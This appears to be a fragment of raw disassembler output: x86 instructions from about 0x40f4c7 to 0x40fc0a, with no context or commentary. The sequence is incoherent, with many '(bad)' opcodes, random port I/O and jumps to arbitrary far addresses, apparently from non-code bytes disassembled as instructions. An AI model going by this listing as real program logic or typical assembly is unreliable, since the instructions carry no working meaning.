  40f4c7:	cmp    DWORD PTR [edx-0x41],ecx
  40f4ca:	mov    ebx,0x46993f45
  40f4cf:	xor    esp,DWORD PTR es:[ecx+esi*8]
  40f4d3:	adc    al,0x88
  40f4d5:	inc    ebp
  40f4d6:	test   al,0x1f
  40f4d8:	test   BYTE PTR [edx+0x9],ch
  40f4db:	outs   dx,DWORD PTR ds:[esi]
  40f4dc:	cld    
  40f4dd:	adc    eax,0xbf490d9a
  40f4e2:	xlat   BYTE PTR ds:[ebx]
  40f4e3:	inc    ecx
  40f4e4:	gs xor dl,cl
  40f4e7:	stos   BYTE PTR es:[edi],al
  40f4e8:	add    BYTE PTR [esi],ah
  40f4ea:	xchg   esi,eax
  40f4eb:	arpl   WORD PTR [eax],di
  40f4ed:	sub    al,0x9c
  40f4ef:	sub    eax,ebx
  40f4f1:	push   es
  40f4f2:	pop    esi
  40f4f3:	xchg   ebp,eax
  40f4f4:	imul   eax,eax,0xdd2eda6
  40f4fa:	test   al,0x2a
  40f4fc:	mov    al,ds:0xa41d7af4
  40f501:	pushf  
  40f502:	rcl    BYTE PTR [edx+0x34],cl
  40f505:	(bad)  
  40f506:	mov    eax,0x401b5d03
  40f50b:	push   0xfffffff4
  40f50d:	shl    DWORD PTR [edi],cl
  40f50f:	or     al,BYTE PTR [edx-0x5d5646b4]
  40f515:	jbe    0x40f554
  40f517:	arpl   di,bx
  40f519:	mov    ch,0x8e
  40f51b:	das    
  40f51c:	xor    dh,ah
  40f51e:	adc    eax,0xb56ab1c1
  40f523:	retf   0xe4e4
  40f526:	and    al,0xe3
  40f528:	jecxz  0x40f50d
  40f52a:	mov    WORD PTR [ebp+0xfa8598d],cs
  40f530:	shr    bh,1
  40f532:	neg    ecx
  40f534:	fcomp  st(0)
  40f536:	pusha  
  40f537:	arpl   WORD PTR [ebx-0x7d],sp
  40f53a:	push   esi
  40f53b:	stos   DWORD PTR es:[edi],eax
  40f53c:	inc    ebp
  40f53d:	mov    ch,0x5a
  40f53f:	imul   ebp,DWORD PTR gs:[ecx-0x77],0xea49c9c9
  40f547:	cmc    
  40f548:	mov    edx,0x4e9d0745
  40f54d:	xchg   DWORD PTR [ebx-0x1a8dd0e9],ecx
  40f553:	retf   0x5615
  40f556:	push   esi
  40f557:	push   esi
  40f558:	push   0xa5e15ab5
  40f55d:	dec    ebx
  40f55e:	xchg   edi,eax
  40f55f:	sahf   
  40f560:	js     0x40f55b
  40f562:	in     eax,0x97
  40f564:	mov    edi,0x85c2e176
  40f569:	out    0x37,eax
  40f56b:	aaa    
  40f56c:	aaa    
  40f56d:	das    
  40f56e:	mov    eax,ds:0x3ccd63c6
  40f573:	or     al,ch
  40f575:	sar    BYTE PTR [edi+eax*2+0x64],cl
  40f579:	int3   
  40f57a:	sub    BYTE PTR [ebx],dh
  40f57c:	enter  0x2a3,0x59
  40f580:	mov    al,0x2f
  40f582:	sub    eax,ebx
  40f584:	addr16 jle 0x40f594
  40f587:	push   ebx
  40f588:	test   al,0xa0
  40f58a:	cmp    eax,0xcbcbcb0f
  40f58f:	push   edi
  40f590:	xchg   edi,eax
  40f591:	xchg   edi,eax
  40f592:	xchg   edi,eax
  40f593:	das    
  40f594:	(bad)  
  40f595:	(bad)  
  40f596:	outs   dx,DWORD PTR ds:[esi]
  40f597:	std    
  40f598:	(bad)  
  40f599:	push   edi
  40f59a:	sub    dl,BYTE PTR [ebp-0x54a952b6]
  40f5a0:	aad    0x17
  40f5a2:	pop    ss
  40f5a3:	pop    ss
  40f5a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a5:	out    0xe6,eax
  40f5a7:	out    0xe6,al
  40f5a9:	imul   DWORD PTR [esi]
  40f5ab:	mov    cs,WORD PTR cs:[ebp-0x42307071]
  40f5b2:	std    
  40f5b3:	ins    DWORD PTR es:[edi],dx
  40f5b4:	outs   dx,DWORD PTR ds:[esi]
  40f5b5:	sti    
  40f5b6:	call   0xc13132f2
  40f5bb:	je     0x40f576
  40f5bd:	push   esp
  40f5be:	and    dl,BYTE PTR [ecx+0x75cea192]
  40f5c4:	cmp    BYTE PTR [eax],bl
  40f5c6:	or     al,0xb8
  40f5c8:	jp     0x40f5af
  40f5ca:	or     bh,BYTE PTR [ebp+0x39854f5e]
  40f5d0:	xchg   ecx,esp
  40f5d2:	mov    ?,WORD PTR [esi]
  40f5d4:	add    eax,0xe28270f3
  40f5d9:	mov    ?,WORD PTR [eax-0x227653d1]
  40f5df:	jge    0x40f62a
  40f5e1:	pop    ss
  40f5e2:	sub    eax,0xd99155a8
  40f5e7:	outs   dx,BYTE PTR ds:[esi]
  40f5e8:	scas   al,BYTE PTR es:[edi]
  40f5e9:	fwait
  40f5ea:	sbb    DWORD PTR [edi],esi
  40f5ec:	into   
  40f5ed:	std    
  40f5ee:	add    eax,0x1bc35c20
  40f5f3:	push   0x76
  40f5f5:	out    0xd5,al
  40f5f7:	cmc    
  40f5f8:	dec    ebp
  40f5f9:	push   esi
  40f5fa:	push   esi
  40f5fb:	xlat   BYTE PTR ds:[ebx]
  40f5fc:	pop    ecx
  40f5fd:	ds jge 0x40f596
  40f600:	inc    eax
  40f601:	out    0x6a,eax
  40f603:	ins    BYTE PTR es:[edi],dx
  40f604:	xor    al,0xaa
  40f606:	xor    al,0x9b
  40f608:	or     eax,0x250df3be
  40f60d:	stos   BYTE PTR es:[edi],al
  40f60e:	(bad)  
  40f610:	loopne 0x40f619
  40f612:	ds jno 0x40f61c
  40f615:	sahf   
  40f616:	cmp    al,0xc2
  40f618:	dec    di
  40f61a:	jo     0x40f605
  40f61c:	jb     0x40f5ea
  40f61e:	jmp    0xb4f8:0x2ea716ea
  40f625:	ss scas eax,DWORD PTR es:[edi]
  40f627:	lock jmp 0xff7a8d5c
  40f62d:	in     al,dx
  40f62e:	inc    ebp
  40f62f:	out    dx,al
  40f630:	pop    esi
  40f631:	in     al,dx
  40f632:	push   ecx
  40f633:	test   eax,0x8ce9d02c
  40f638:	jle    0x40f67c
  40f63a:	jecxz  0x40f676
  40f63c:	ss jbe 0x40f5e0
  40f63f:	add    ah,BYTE PTR [edx+edi*4]
  40f642:	push   esi
  40f643:	cs xchg edi,eax
  40f645:	inc    ebx
  40f646:	pop    esi
  40f647:	lds    esi,FWORD PTR [esi+0x53]
  40f64a:	sub    al,BYTE PTR [eax+0x4958994]
  40f650:	(bad)  
  40f651:	lods   eax,DWORD PTR ds:[esi]
  40f652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f653:	rol    BYTE PTR [eax-0x2a],1
  40f656:	push   es
  40f657:	loopne 0x40f60f
  40f659:	dec    edx
  40f65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f65b:	mov    ds:0xa9d1b8f,al
  40f660:	in     al,dx
  40f661:	mov    dh,0xeb
  40f663:	sbb    esi,esi
  40f665:	scas   al,BYTE PTR es:[edi]
  40f666:	ja     0x40f6b4
  40f668:	sar    DWORD PTR [edx+0x585d5d09],1
  40f66e:	pop    eax
  40f66f:	pusha  
  40f670:	jbe    0x40f6e8
  40f672:	ss xchg ebx,eax
  40f674:	fwait
  40f675:	int    0xec
  40f677:	mov    edi,0x9712e974
  40f67c:	das    
  40f67d:	pop    edi
  40f67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f67f:	xlat   BYTE PTR ds:[ebx]
  40f680:	jmp    0x40f653
  40f682:	push   0xaeebb834
  40f687:	mov    ebx,0xcd9d9d98
  40f68c:	fs push cs
  40f68e:	mov    fs,WORD PTR [edx-0x31188c78]
  40f694:	jno    0x40f68a
  40f696:	call   0x37782cec
  40f69b:	or     DWORD PTR [ebx-0xb],eax
  40f69e:	in     eax,dx
  40f69f:	ret    0x6c30
  40f6a2:	popf   
  40f6a3:	aas    
  40f6a4:	jg     0x40f6a4
  40f6a6:	fcomp  DWORD PTR [ecx-0x156198cd]
  40f6ac:	je     0x40f6e8
  40f6ae:	sub    ebp,DWORD PTR [eax]
  40f6b0:	and    dh,BYTE PTR [ebx]
  40f6b2:	test   eax,0xe6510c74
  40f6b7:	jne    0x40f6b7
  40f6b9:	fnsave [esp+edx*8+0x168a3d59]
  40f6c0:	mov    cl,BYTE PTR [eax-0x32240c4]
  40f6c6:	out    0xd5,al
  40f6c8:	pop    es
  40f6c9:	adc    DWORD PTR [edx],0xffffffa2
  40f6cc:	shl    DWORD PTR [eax-0x30],0x1f
  40f6d0:	or     al,0x6
  40f6d2:	fistp  DWORD PTR [ebx-0x38946465]
  40f6d8:	mov    ds,WORD PTR ds:0xef77b73b
  40f6de:	fdivrp st(1),st
  40f6e0:	cmp    ebp,edi
  40f6e2:	mov    esp,0xab5ea973
  40f6e7:	mov    ebp,0x9fa7a9f3
  40f6ec:	sahf   
  40f6ed:	outs   dx,BYTE PTR ds:[esi]
  40f6ee:	call   0x173bf9ef
  40f6f3:	pop    ss
  40f6f4:	cdq    
  40f6f5:	popf   
  40f6f6:	popf   
  40f6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6f8:	fldcw  WORD PTR [edx+esi*2-0x31]
  40f6fc:	mov    ebp,0x849322f7
  40f701:	mov    ch,0xd5
  40f703:	push   ebp
  40f704:	mov    dh,0xb6
  40f706:	mov    dh,0x58
  40f708:	pop    ebx
  40f709:	pop    ebp
  40f70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f70b:	(bad)  [edx+0x11]
  40f70e:	inc    ebp
  40f70f:	xchg   ecx,eax
  40f710:	dec    edx
  40f711:	jle    0x40f73c
  40f713:	and    eax,0x59a42e5e
  40f718:	test   al,0x4e
  40f71a:	iret   
  40f71b:	adc    BYTE PTR [ebp+0x6ff966fd],dh
  40f721:	ins    DWORD PTR es:[edi],dx
  40f722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f723:	xchg   DWORD PTR [ecx+0x2],eax
  40f726:	mov    ecx,0x9191a7e0
  40f72b:	xchg   ecx,eax
  40f72c:	arpl   WORD PTR [esi+ebp*2],di
  40f72f:	pop    es
  40f730:	gs inc esp
  40f732:	mov    fs,WORD PTR [edi+0x4b9510b2]
  40f738:	and    eax,0x25252015
  40f73d:	and    ecx,0xffffff90
  40f740:	(bad)  
  40f741:	pusha  
  40f742:	sar    dl,0xfa
  40f745:	xchg   esi,eax
  40f746:	cmp    eax,0x280e5caf
  40f74b:	push   ebp
  40f74c:	retf   0xaad4
  40f74f:	gs out dx,al
  40f751:	cwde   
  40f752:	fwait
  40f753:	loopne 0x40f716
  40f755:	xlat   BYTE PTR ds:[ebx]
  40f756:	dec    esp
  40f757:	xor    DWORD PTR [ecx],esi
  40f759:	faddp  st(0),st
  40f75b:	or     esi,esi
  40f75d:	repnz leave 
  40f75f:	enter  0xd3a3,0xbe
  40f763:	xor    DWORD PTR [ebp-0x527ce113],0xffffffd3
  40f76a:	les    esi,FWORD PTR [ecx-0x7e]
  40f76d:	out    dx,eax
  40f76e:	(bad)  
  40f76f:	mov    eax,es:0x7e80820d
  40f775:	mov    edi,0x7c00c85f
  40f77a:	(bad)  
  40f77c:	cli    
  40f77d:	rol    BYTE PTR [edi+0x1aaaf43e],1
  40f783:	les    esi,FWORD PTR [esi-0x1b]
  40f786:	push   es
  40f787:	je     0x40f806
  40f789:	mov    eax,ds:0x75c7e826
  40f78e:	add    esp,DWORD PTR [esi-0x1]
  40f791:	aam    0x36
  40f793:	cmc    
  40f794:	in     eax,dx
  40f795:	and    al,0x63
  40f797:	arpl   WORD PTR [ebx-0x6],sp
  40f79a:	mov    esp,0xbca0366c
  40f79f:	gs jle 0x40f7c9
  40f7a2:	xlat   BYTE PTR ds:[ebx]
  40f7a3:	pop    esp
  40f7a4:	mov    esi,0xee10a915
  40f7a9:	mov    edx,0x2a5bc4cd
  40f7ae:	mov    cl,0x67
  40f7b0:	iret   
  40f7b1:	push   ds
  40f7b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7b5:	imul   esi,DWORD PTR [edx+ebx*1],0x71c66b99
  40f7bc:	ins    BYTE PTR es:[edi],dx
  40f7bd:	sub    eax,0x8b56adf5
  40f7c2:	jp     0x40f781
  40f7c4:	into   
  40f7c5:	sbb    eax,0xc2c1dc77
  40f7ca:	ret    0xf502
  40f7cd:	jp     0x40f7ac
  40f7cf:	fisub  WORD PTR [ebx-0x60]
  40f7d2:	mov    eax,ds:0x2793c9f0
  40f7d7:	mov    ecx,0x4e92e974
  40f7dc:	mov    dl,BYTE PTR [edx-0x56ad4ece]
  40f7e2:	xor    al,0xfd
  40f7e4:	xchg   esi,eax
  40f7e5:	mov    bh,0xbc
  40f7e7:	in     eax,0x7
  40f7e9:	(bad)  
  40f7eb:	fdivrp st(7),st
  40f7ed:	jle    0x40f7d6
  40f7ef:	cdq    
  40f7f0:	xor    esp,DWORD PTR [edi+0x3e]
  40f7f3:	call   esp
  40f7f5:	push   ebx
  40f7f6:	dec    edi
  40f7f7:	cmp    eax,0xf1f8fc7a
  40f7fc:	push   ebx
  40f7fd:	fcmovu st,st(7)
  40f7ff:	pop    edi
  40f800:	bound  edx,QWORD PTR [eax+edi*8-0x47]
  40f804:	retf   
  40f805:	xlat   BYTE PTR ds:[ebx]
  40f806:	in     eax,dx
  40f807:	jp     0x40f7f0
  40f809:	fsub   DWORD PTR [edx]
  40f80b:	js     0x40f7a1
  40f80d:	fistp  WORD PTR [edi+0x674ae1e6]
  40f813:	adc    DWORD PTR [ebx-0x1bb0bef8],edi
  40f819:	daa    
  40f81a:	add    al,0x12
  40f81c:	fcomip st,st(7)
  40f81e:	retf   
  40f81f:	or     ecx,DWORD PTR [ebx]
  40f821:	or     ecx,DWORD PTR [ebx]
  40f823:	neg    ebp
  40f825:	ja     0x40f806
  40f827:	loope  0x40f81a
  40f829:	icebp  
  40f82a:	icebp  
  40f82b:	cmp    ebp,esi
  40f82d:	mov    edi,0x4bc3feff
  40f832:	dec    ebx
  40f833:	dec    ebx
  40f834:	fist   WORD PTR [edi+ebp*4-0x29]
  40f838:	daa    
  40f839:	imul   esi,DWORD PTR [ebp+0x638e355a],0x2e
  40f840:	pop    esp
  40f841:	mov    eax,0x2793c9c0
  40f846:	pop    ecx
  40f847:	pop    ecx
  40f848:	pop    ecx
  40f849:	loope  0x40f823
  40f84b:	or     ebp,DWORD PTR [edi]
  40f84d:	push   eax
  40f84e:	sub    dl,BYTE PTR [ebp-0x13142858]
  40f854:	(bad)  [edi+0x59d9d98f]
  40f85a:	data16 cmp WORD PTR [bx+si-0x39],di
  40f860:	sbb    eax,0x8e475dc
  40f865:	add    ch,al
  40f867:	cmc    
  40f868:	sti    
  40f869:	pop    esp
  40f86a:	pop    ecx
  40f86b:	pop    ecx
  40f86c:	mov    eax,ds:0xb1b16add
  40f871:	mov    esi,0x3a0a6cae
  40f876:	dec    esi
  40f877:	inc    ecx
  40f878:	mov    al,ds:0x6c6d77f5
  40f87d:	hlt    
  40f87e:	repnz test bh,ch
  40f881:	stos   BYTE PTR es:[edi],al
  40f882:	imul   ecx,esi,0x4b
  40f885:	gs or  bl,bl
  40f888:	gs (bad) 
  40f88a:	es cli 
  40f88c:	shl    BYTE PTR [ebp+0x38eb980f],1
  40f892:	jno    0x40f8a4
  40f894:	nop
  40f895:	mov    edx,0xb7b7b71d
  40f89a:	sbb    DWORD PTR [esi],ecx
  40f89c:	xchg   DWORD PTR [ebx+ecx*8+0x59d51b65],edx
  40f8a3:	sub    dl,BYTE PTR [ebp-0x51fb66d8]
  40f8a9:	call   0x3110:0x60c02569
  40f8b0:	sbb    BYTE PTR [esp+ebp*4+0x6f],al
  40f8b4:	mov    ah,0x39
  40f8b6:	jno    0x40f8aa
  40f8b8:	mov    esp,0x3531ec4d
  40f8bd:	cmp    esi,eax
  40f8bf:	clc    
  40f8c0:	les    eax,FWORD PTR [ebx+edi*2]
  40f8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c5:	cmp    DWORD PTR [ebp+0x3f6b7121],esi
  40f8cb:	out    0x63,al
  40f8cd:	push   ebx
  40f8ce:	jp     0x40f88d
  40f8d0:	fimul  WORD PTR [eax-0x56ad4ff5]
  40f8d6:	lock aam 0x53
  40f8d9:	dec    edi
  40f8da:	mov    ch,0x8b
  40f8dc:	aas    
  40f8dd:	stc    
  40f8de:	in     eax,dx
  40f8df:	imul   edi,DWORD PTR [ebx-0x4bbcffbf],0x6f
  40f8e6:	aas    
  40f8e7:	or     al,0x87
  40f8e9:	call   0x710c:0x10876390
  40f8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8f1:	arpl   WORD PTR [ebx-0x1b],bx
  40f8f4:	inc    ecx
  40f8f5:	iret   
  40f8f6:	(bad)  
  40f8f7:	jmp    0x2dbd6217
  40f8fc:	mov    bh,0x9e
  40f8fe:	stos   DWORD PTR es:[edi],eax
  40f8ff:	inc    esi
  40f900:	in     al,dx
  40f901:	je     0x40f94f
  40f903:	(bad)  
  40f904:	js     0x40f8b9
  40f906:	outs   dx,BYTE PTR ds:[esi]
  40f907:	hlt    
  40f908:	sti    
  40f909:	pop    edx
  40f90a:	lods   eax,DWORD PTR ds:[esi]
  40f90b:	inc    esi
  40f90c:	mov    bl,0xd9
  40f90e:	fs iret 
  40f910:	sahf   
  40f911:	cmp    eax,0xb9b5e4b6
  40f916:	jg     0x40f8d7
  40f918:	fbld   TBYTE PTR [edi-0x4d4e952b]
  40f91e:	mov    dl,0x42
  40f920:	sbb    BYTE PTR [esi+0xe75ebd4],al
  40f926:	pop    ds
  40f927:	ds int3 
  40f929:	(bad)  
  40f92b:	pushf  
  40f92c:	mov    ch,0xea
  40f92e:	sbb    edi,ebp
  40f930:	jle    0x40f9a5
  40f932:	jae    0x40f8c7
  40f934:	adc    esp,DWORD PTR [edi]
  40f936:	dec    esi
  40f937:	jo     0x40f91a
  40f939:	ret    0x8605
  40f93c:	inc    ebx
  40f93d:	cmc    
  40f93e:	fiadd  WORD PTR [esi]
  40f940:	cmc    
  40f941:	sbb    bh,bh
  40f943:	jp     0x40f955
  40f945:	add    al,0x2c
  40f947:	cs cs jb 0x40f92f
  40f94b:	enter  0xa991,0xb7
  40f94f:	mov    edi,0xf5dfedfd
  40f954:	ror    DWORD PTR [edi],0x7e
  40f957:	lock add ebp,DWORD PTR [edi]
  40f95a:	mov    esi,0x9f73e2f8
  40f95f:	(bad)  
  40f960:	hlt    
  40f961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f962:	push   eax
  40f964:	cdq    
  40f965:	addr16 sahf 
  40f967:	jns    0x40f993
  40f969:	push   esp
  40f96a:	push   eax
  40f96b:	sar    eax,0x90
  40f96e:	repnz pushf 
  40f970:	mov    dl,0x88
  40f972:	adc    DWORD PTR [eax-0x158511fe],edi
  40f978:	sub    DWORD PTR [ecx+0x5e],0xe8973ec1
  40f97f:	xchg   DWORD PTR [ebp+0x313aa952],esp
  40f985:	xor    DWORD PTR [ecx-0x42211099],esi
  40f98b:	or     ecx,DWORD PTR [ebx+0x4b]
  40f98e:	dec    ebx
  40f98f:	sti    
  40f990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f993:	out    0x5e,eax
  40f995:	sti    
  40f996:	fcmovbe st,st(7)
  40f998:	push   ds
  40f999:	pop    edx
  40f99a:	pop    edx
  40f99b:	pop    edx
  40f99c:	jp     0x40f97b
  40f99e:	clc    
  40f99f:	clc    
  40f9a0:	clc    
  40f9a1:	test   BYTE PTR [ebx-0x1a523d4c],bl
  40f9a7:	mov    eax,0xad40b0b0
  40f9ac:	push   esi
  40f9ad:	jecxz  0x40f98b
  40f9af:	mov    ecx,0x6adbb473
  40f9b4:	int3   
  40f9b5:	jbe    0x40f972
  40f9b7:	pop    ebp
  40f9b8:	mov    ds,WORD PTR [edi]
  40f9ba:	aas    
  40f9bb:	into   
  40f9bc:	mov    ebp,DWORD PTR [edi]
  40f9be:	mov    esi,0xfcc21968
  40f9c3:	cld    
  40f9c4:	mov    esp,0x68d1179a
  40f9c9:	xor    BYTE PTR [ecx],dh
  40f9cb:	ds into 
  40f9cd:	mov    esi,0x7839fbfd
  40f9d2:	(bad)  
  40f9d3:	sbb    eax,0x6ed04278
  40f9d8:	mov    ch,0xe8
  40f9da:	je     0x40fa16
  40f9dc:	ss das 
  40f9de:	shl    DWORD PTR [eax+0x30],0xb0
  40f9e2:	dec    esp
  40f9e3:	and    esi,edx
  40f9e5:	div    ebx
  40f9e7:	sbb    DWORD PTR [ebp+0x83996f2],eax
  40f9ed:	xchg   ecx,eax
  40f9ee:	dec    edx
  40f9ef:	icebp  
  40f9f0:	pushf  
  40f9f1:	call   0x52f3:0xc40cf220
  40f9f8:	data16 loopne 0x40f99b
  40f9fb:	or     ebp,DWORD PTR [ecx-0x1bcf3c29]
  40fa01:	loopne 0x40f984
  40fa03:	add    edx,DWORD PTR [ebx+ebp*1-0x512245eb]
  40fa0a:	jb     0x40f997
  40fa0c:	or     DWORD PTR es:[ebp-0x5c996892],ebx
  40fa13:	xchg   ecx,eax
  40fa14:	xor    cl,BYTE PTR [edi+eax*4]
  40fa17:	mov    ch,bl
  40fa19:	cmp    esp,edi
  40fa1b:	push   ecx
  40fa1c:	adc    al,0x71
  40fa1e:	in     eax,0xea
  40fa20:	cmp    dl,BYTE PTR [edi-0x7df6a9a9]
  40fa26:	gs cmp eax,0xb191bc0e
  40fa2c:	imul   ebp,esp,0x5f053b24
  40fa32:	lds    esi,FWORD PTR [ecx+0x7c]
  40fa35:	fld    TBYTE PTR [ebx+0x6edbe701]
  40fa3b:	adc    BYTE PTR [eax+0xf],al
  40fa3e:	int3   
  40fa3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa40:	xchg   BYTE PTR [esi],cl
  40fa42:	push   edx
  40fa43:	es inc esp
  40fa45:	push   ecx
  40fa46:	push   0xfffffff4
  40fa48:	push   ebx
  40fa49:	test   BYTE PTR [ecx+0x22],ah
  40fa4c:	in     al,0xd2
  40fa4e:	jl     0x40fabe
  40fa50:	push   edx
  40fa51:	mov    ebx,0xbd448c4c
  40fa56:	adc    eax,0x6197406e
  40fa5b:	dec    esp
  40fa5c:	dec    esp
  40fa5d:	dec    esp
  40fa5e:	xor    BYTE PTR [ebx],dh
  40fa60:	xor    eax,DWORD PTR [ebx-0x53]
  40fa63:	push   esi
  40fa64:	mov    bl,0x1c
  40fa66:	xlat   BYTE PTR ds:[ebx]
  40fa67:	and    BYTE PTR [esi+0x5675f5f5],cl
  40fa6d:	push   esi
  40fa6e:	push   esi
  40fa6f:	push   0xbef8dbb7
  40fa74:	iret   
  40fa75:	(bad)  
  40fa77:	sbb    al,0x7b
  40fa79:	imul   esi
  40fa7b:	mov    ch,0xf3
  40fa7d:	(bad)  
  40fa7f:	(bad)  
  40fa80:	pop    ebx
  40fa81:	pop    ebx
  40fa82:	pop    ebx
  40fa83:	jecxz  0x40fa0a
  40fa85:	pop    ss
  40fa86:	pop    esi
  40fa87:	loopne 0x40fa6b
  40fa89:	lds    ecx,FWORD PTR [ebx-0x582040c]
  40fa8f:	std    
  40fa90:	mov    esi,0x60618ebd
  40fa95:	cs icebp 
  40fa97:	fbstp  TBYTE PTR [ebp-0x29]
  40fa9a:	pop    ebp
  40fa9b:	sbb    al,0x3a
  40fa9d:	je     0x40fa27
  40fa9f:	mov    DWORD PTR [ecx-0x3d95e5f7],ecx
  40faa5:	dec    edi
  40faa6:	xor    BYTE PTR [ebx],bh
  40faa8:	cmp    edi,ebx
  40faaa:	cli    
  40faab:	xlat   BYTE PTR ds:[ebx]
  40faac:	mov    ebp,0x7faf75ee
  40fab1:	jmp    0x3fb3:0xf6bea7a9
  40fab8:	sti    
  40fab9:	mov    bl,0xff
  40fabb:	jbe    0x40fb22
  40fabd:	gs in  eax,0xa
  40fac0:	retf   0x6f5a
  40fac3:	es push eax
  40fac5:	and    al,0xce
  40fac7:	xor    ah,BYTE PTR [ecx+ebx*1+0x41]
  40facb:	jbe    0x40fa63
  40facd:	dec    ebx
  40face:	push   ss
  40facf:	(bad)  
  40fad0:	out    0xd1,eax
  40fad2:	outs   dx,DWORD PTR ds:[esi]
  40fad3:	sar    DWORD PTR [edx],1
  40fad5:	cli    
  40fad6:	fiadd  DWORD PTR [ebx]
  40fad8:	inc    eax
  40fad9:	int3   
  40fada:	iret   
  40fadb:	iret   
  40fadc:	iret   
  40fadd:	mov    esp,0x7b6f6ded
  40fae2:	jmp    0x40fa7f
  40fae4:	(bad)  
  40fae6:	out    0x37,al
  40fae8:	iret   
  40fae9:	int3   
  40faea:	int3   
  40faeb:	fcomp  QWORD PTR [ebp+0x2e]
  40faee:	xchg   edi,eax
  40faef:	imul   edx,ebp,0x6a
  40faf2:	aad    0x13
  40faf4:	inc    edx
  40faf5:	pop    eax
  40faf6:	sub    bh,0x76
  40faf9:	inc    edi
  40fafa:	repz fstp DWORD PTR [ebx-0x5271c721]
  40fb01:	pop    edx
  40fb02:	je     0x40fafa
  40fb04:	in     al,dx
  40fb05:	pop    ecx
  40fb06:	sbb    edx,eax
  40fb08:	in     al,0x66
  40fb0a:	mov    ecx,0x9cbb76ed
  40fb0f:	cmp    BYTE PTR [ecx-0x3e],dh
  40fb12:	xor    ah,BYTE PTR [eax-0x2d]
  40fb15:	inc    edi
  40fb16:	inc    ecx
  40fb17:	adc    BYTE PTR [eax],dh
  40fb19:	xor    eax,0xa5bec535
  40fb1e:	and    eax,0xb34f4cf6
  40fb23:	je     0x40fb15
  40fb25:	and    ch,cl
  40fb27:	inc    esi
  40fb28:	ret    
  40fb29:	or     al,BYTE PTR [ecx-0x5344892]
  40fb2f:	ficomp DWORD PTR [edx]
  40fb31:	std    
  40fb32:	pop    esi
  40fb33:	(bad)  
  40fb34:	jbe    0x40faf1
  40fb36:	dec    ebp
  40fb37:	dec    edi
  40fb38:	pop    es
  40fb39:	int3   
  40fb3a:	and    al,0x86
  40fb3c:	leave  
  40fb3d:	or     al,BYTE PTR [ecx+0x671d90d4]
  40fb43:	push   ds
  40fb44:	mov    ebp,0xdea0d71
  40fb49:	jmp    0xd46:0x45aa39db
  40fb50:	aam    0xc
  40fb52:	shl    DWORD PTR [ebx],0x45
  40fb55:	mov    al,ds:0xf4f818a0
  40fb5a:	hlt    
  40fb5b:	xor    al,0x41
  40fb5d:	test   eax,0xeac71244
  40fb62:	stc    
  40fb63:	jne    0x40fb6c
  40fb65:	mov    edx,0x6122a536
  40fb6a:	in     al,0x4e
  40fb6c:	outs   dx,DWORD PTR ds:[esi]
  40fb6d:	ja     0x40fbac
  40fb6f:	dec    ebp
  40fb70:	stc    
  40fb71:	arpl   WORD PTR ds:0xe9d3a3cf,di
  40fb77:	mov    WORD PTR [edi+ebx*1-0x5454fefc],ds
  40fb7e:	stos   DWORD PTR es:[edi],eax
  40fb7f:	imul   edi,DWORD PTR [edx+ecx*8+0x3a6a6ed],0x27
  40fb87:	mov    DWORD PTR [ecx+0x5e391fe],edx
  40fb8d:	push   eax
  40fb8e:	arpl   dx,bx
  40fb90:	sbb    BYTE PTR [ecx+eax*2],al
  40fb93:	jge    0x40fba0
  40fb95:	iret   
  40fb96:	repz xchg ecx,eax
  40fb98:	xor    cl,cl
  40fb9a:	or     al,0x96
  40fb9c:	sbb    ecx,ecx
  40fb9e:	add    edx,DWORD PTR [eax-0x7b121e89]
  40fba4:	or     ah,bl
  40fba6:	loopne 0x40fb45
  40fba8:	jmp    0x27676596
  40fbad:	daa    
  40fbae:	inc    edi
  40fbaf:	repnz mov cl,0x77
  40fbb2:	cmp    bl,BYTE PTR ds:0x59575756
  40fbb8:	pop    edi
  40fbb9:	pop    edi
  40fbba:	inc    edi
  40fbbb:	or     BYTE PTR [ecx+0x7d],ah
  40fbbe:	clc    
  40fbbf:	xchg   ebx,eax
  40fbc0:	xchg   ebx,eax
  40fbc1:	xchg   ebx,eax
  40fbc2:	cli    
  40fbc3:	cmp    DWORD PTR [ebp-0x42],esi
  40fbc6:	(bad)  
  40fbc7:	lods   eax,DWORD PTR ds:[esi]
  40fbc8:	sub    eax,0xcd3e9f4e
  40fbcd:	jmp    0x452ea3a5
  40fbd2:	sahf   
  40fbd3:	xchg   ebp,eax
  40fbd4:	xchg   ebp,eax
  40fbd5:	xchg   ebp,eax
  40fbd6:	mov    ds:0xfd1e8f47,eax
  40fbdb:	and    ebx,edi
  40fbdd:	test   edi,0xeee6e6e7
  40fbe3:	fidiv  WORD PTR [edi-0x566e2091]
  40fbe9:	test   eax,0xa952c5a9
  40fbee:	and    al,0xc2
  40fbf0:	xor    BYTE PTR [esi+esi*2+0x76],ah
  40fbf4:	xchg   esi,eax
  40fbf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbf7:	and    eax,0xca6ad1d
  40fbfc:	mov    edi,ebp
  40fbfe:	jle    0x40fc5f
  40fc00:	dec    ecx
  40fc01:	xchg   esi,eax
  40fc02:	xor    ah,ah
  40fc04:	lea    ebp,[edi+0x7c]
  40fc07:	jecxz  0x40fc24
  40fc09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
